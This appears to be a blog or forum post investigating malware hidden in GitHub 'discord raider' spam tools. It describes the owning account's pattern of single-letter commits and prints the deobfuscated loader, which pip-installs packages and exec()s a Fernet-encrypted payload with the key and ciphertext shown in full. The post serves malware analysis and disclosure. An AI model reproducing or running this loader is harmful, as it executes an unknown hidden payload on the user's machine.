This is the github repo which contains the malware

Hello, I have found something interesting, malware hidden within open source 'discord raider' tools. 

First a quick explanation, a 'discord raider' is a piece of software that spams a server with fake accounts which send messages repeatedly in an attempt to annoy people. These 'tools' are mostly used by 12 year skids, who feel like a master hacker by downloading garbage on to the family computer.

## Part one - github

The github repo for the malware was created about a day ago from writing this, intrestingly enough, the majority of the commits are replacing the single letter in a text file.
The more interesting thing is the account that owns the github repo, one `Michzael-Fuchslocher`, alongside the discord raid repo, they have several other repos, all discord related skid tools. In all of these repos the pattern of the commits being single letter edits continues. I looked at the code for some of these other repos, and they all seem to contain the same malware.

## Part two - the code itself

The main file contains a single line of semi-colon seperated python code, here is what it looks like when the formatting has been fixed.

    #!python
    import os
    os.system('pip install cryptography')
    os.system('pip install fernet')
    os.system('pip install requests')
    from fernet import Fernet
    import requests
    exec(Fernet(b'eORIbqIAo0lgLsUQKh65VDMfpLQ8xTJeOBYNqzILkqc=').decrypt(b'gAAAAABmxNtp4JGXQHPnCdjhaMgtj9NuIVwKOlXS6F_2WmIe3LPVT99J4L_LQTFe7l5E3fxvsHpbwHDOKxE-rr2HZHybMVtOhaDRzcTTmInOhYst6YzoeX8AwdM-3PYCdWDk4S1_EvIe1SjmZcc0N6r86fiT2_keIjsRXlugsw6ji1QUq8K4YV2KNTv0LdE9lQr_t_dKTpszBnN8mg0XElqMPd7UfhlXUQ=='))
